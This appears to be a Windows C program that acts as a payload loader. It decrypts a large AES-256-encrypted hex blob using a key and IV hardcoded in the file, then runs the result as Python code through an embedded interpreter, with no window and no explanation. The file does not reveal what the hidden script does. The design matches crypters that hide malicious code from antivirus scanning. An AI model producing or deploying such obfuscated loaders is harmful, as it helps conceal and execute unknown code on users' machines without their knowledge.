#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec6163e406f9c05814a9d3ccc6f0b0cccfbedf400d98ca05e38ad84936edbc648c24cb945e388a20e27f7cccb4173389721ef0e9f1978a69a7a2412b3f9edaf46f40c41102657d1f0e85dac4668ace8257af2d0db055d2c9e156e2c0a27737402c2fbf6889823a3a0a05c626ff88b9746aee1d9f58c27a5362fbcd62e890cb86e50066de4a521e9254eff02c244092ceebb439fd44cff0df034f181562b2ef91f269f7b67ffd1ac4bbb3448530bd85dee3d1f1568dde1ed6703bd8c2785360f819de2b7444047b68079da551167344b78ce5083f2ccd0c818a42e2134415fbc86b31747f7f3da116f2a5bae2abd2cac99b83ee42e5cb8be3def0003d69340ccc8dce92c6a3a94ba490fb5fd1f2eaa95efd92e2c2420a696e058201b12b9e93bdb327ba355883ecb8529e51ab345a3cfbd2d65863fd1d6f82ecf1f4c6537852bb0d5c1e9de3d95e55815691f4837971de90aff48f720da2de6b53aca6da04c47abc550119ea8b1159f45f3b6618cb5b035576db472a8c8544e974d0e5fafb57961782a640ca1f8911bba9c14577748a1a6c3dc6ca69fd300a2bfff0e248a3bbf5875bef263290b0f3f17a5a7e3224a11517eba9e3f698b9d3ddc5312ade5b7082cd8915a0deb990e4bd466ef6558a4ed1938b82b13cc906c43b8e084b23a1ec427c1f1837ffbf46c225d900d5b7c51d6622ea855eaecfee2e1c5bbdbf2bb2c0efb3c09199a6d812f303bdcab7e011006841a6087cd16be0997fed085bcb55d9badd29e7068b6832f3f7bc5f35994a648b1870fa359fefd3d0f4dc5ae7dee689126c4d4b933902fcf953bb12001a8d7360c7efdc98abfe248e95898587e47dcf569b082c0d27a47eced34aeb440584d0918ef49f59ae73a5412107c3d0254836bf3f28c8ac6ef4cb51f144708e4a09b1ed8c79139bb53f975d3a6f452338e8e5e6de593fc5f93cb1519abb96ce700f237d58ebbaba8c167697c3a5ee8bc27302b891c5ef42dc085c80d19a57a39fc67032d324903db0a3ab47c40a39e0358d4ec5560059a6e878a42d41e2782ccebf42232437627f1560a53ac8befffcea78855b6f09e3d98a1ddefba690b27a8193dad5a2257710d5b6cc94773927265aa7199f9f739cda4e61881ba1f762b3eefb4afd62f0fd1fc2667f75bd93e5d52a6eacfa801e60e6ec3cfcf3f8dbafe2dc980785a7f1f52e6f4d2c80874484f8af128a3466c43963b7f8957e85185ced0a97bf327cd2774d592d0fafee063a11d604aa3e89ee1e70d2f6df611f7bf115e95e7b02e3c152e6b03eca8f5a62c8ee6035e3915bb6eff4c5c29306ffaa98d020fa80a3a366064dfb2c46475675b1731ce25bdb545533cf74154ab21ffc287ad31e670158349287921d4d9403c2fe5ee9b28f313950b8eed39ac6b7c7ae51175252088e3b07d79e3551dee12aa6ec532142802575fa68c4eb93c85a397fde56b443745baad4e3132339e13b8fe8e447cf32d7cb15662778231423584492d5740602d5d51e3bcc5026dc17809821b95c1f82499671cc57ad718d38b1fbeac366ef3b203001c0438460b68361ea965541e728f357c4860c767d61c5762502ed51dd0e829662101ef324425d972914a5d5931e8ea768af308e9d330273f4cdb53b3b127420685e1eb36bff76497fc7dc3774fbda68aa5916a84c23df59020202ac8a51dd0cc930deb38447e6e0382798ba8d90a2f6997de15bc7a84c1034522a221ebf64def5fc5b508a0446cdf4b7777a484b9ef36f4c4c442e802fcee575febcea64cf2aee367e5fe0187949f27fc613977c14035f6f99b7a08f7677ae0a5c114b9d9d3559732c28e09075300c28f4eb1ee5a662fb8a16bedbf093fd6d2025f18ecfb46c7fa91169bcd96956673441a6711188601accf45665e99d0c4f0d42b3277356b2bc0c56dbc3da10acfd7094a8cc5d5ecc16f9c3a9070dc02f16f659bc094c13bce9642d899d46871d060cddb5c2e1027d580de77cb50ca1c230b7b9a26a1b0109fb1401b5e53c56693ad1ddd334c501c947b2915ebb0a6b42d8deab2e672a4679a8180ddf213c814d3edc0cd6bfc8e48f631279e6a0fdf4cd68f824460d3de85fdba658a1d84a7d8f21f3d99bdbffeab725c897abcc695b1d4f1c4b60cdd30ac0fdb4c14b0fffb677b9964ddbf114af2d191166fcf7a73c9795af6f3744339cbbfc3a11a3f491bd19ff7672a960dbe82ce262f6caf50c098bf1e2ac84241719f426b42ecb72754bf4294ce77bdc474a92b25829032cd6007be14a82512e7eac846bd7d521648df42b535c7665f9b9b95d74d81d15274f34b241ca68f8e9f32c40d6505b5d58559927add728d17c85ef0580544b9fde1f1a172f207267935c913299935d76d3010fc109bacf97564f65f4a8acb9243f6073c8eefb60f810888ea865b8384d0d43b3b7f6ffb4a227d3530e8e4754518763101045dccafefdaf30db093e106cb9b27147f3393538e23fd0c3e7d3aed02faeaf16b704a68449cb57e688b95ba1d78f3c29eae778f2f80f924fcbd9ffbd457eab161c90c85db85f0c011bacdacb7b525956a3b005264930317d42fa6f85d26113ee62473d82b2058746c32834ac5facb0d7dd1dd81b27224b8152c34ab4eb22c67ecca2e34ef9b54956f86b37cc75a026ce03f65bd315bb566e31c116c4c9b55b8351e1520f03e06e2c502630ee0f40e36c77fc15385ef58aec3b4ed9f7680fb1da52fb249f6bce29b982ff5f8f184b464d5eeb6310d52a5d662d8c2cab67353929f27dfa510af8fa32f353f11efadbc746e8015827eab9900abebc17d5085d8d9b065c49f445062d7d76426a9c579c762e64fc0cd5ebcf0b6c5b83c85f555a09e99b33a52fa2da1e3c56b5c27ad4e100bdd70e72351d01c61ec0c17ea6af13724dd3734ce42f58056c95e66f231f8a9c6cf8c7d1f1e63bef7174c83dd7dde6fb02fe890442e185366ce073eb5d6986600cbc7d4229cd7d3adc9c89e4737526ff041b79293552ebd6778c5e08a2bd18a2a9cd0854b75c19b64aaf2a30cead16107c799798122b8179f14a500";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
